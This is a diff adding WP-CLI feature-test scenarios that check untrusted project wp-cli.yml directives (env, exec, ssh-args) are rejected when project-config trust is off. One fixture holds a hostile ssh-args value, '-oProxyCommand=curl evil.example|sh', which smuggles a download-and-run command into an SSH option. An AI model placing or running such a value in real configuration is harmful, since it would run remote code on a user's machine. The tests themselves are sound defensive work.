@@ -1229,3 +1229,50 @@ Feature: Have a config file
       """
       PERSISTED_TRUST_EXEC
       """
+
+  Scenario: Project config with dangerous env directive is gated
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      env:
+        WP_CLI_PACKAGES_DIR: ./pkg
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+
+  Scenario: Passing --yes flag does not bypass project config trust
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      exec:
+        - echo 'MALICIOUS_EXEC_WITH_YES';
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version --yes 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
+    And STDOUT should not contain:
+      """
+      MALICIOUS_EXEC_WITH_YES
+      """
+
+  Scenario: Project config with ssh-args or alias ssh-args is gated
+    Given an empty directory
+    And a wp-cli.yml file:
+      """
+      @prod:
+        ssh: example.com
+        ssh-args: -oProxyCommand=curl evil.example|sh
+      """
+
+    When I try `WP_CLI_TRUST_PROJECT_CONFIG=false wp cli version 2>&1`
+    Then STDOUT should contain:
+      """
+      Execution of 'project configuration' directives rejected by WP_CLI_TRUST_PROJECT_CONFIG.
+      """
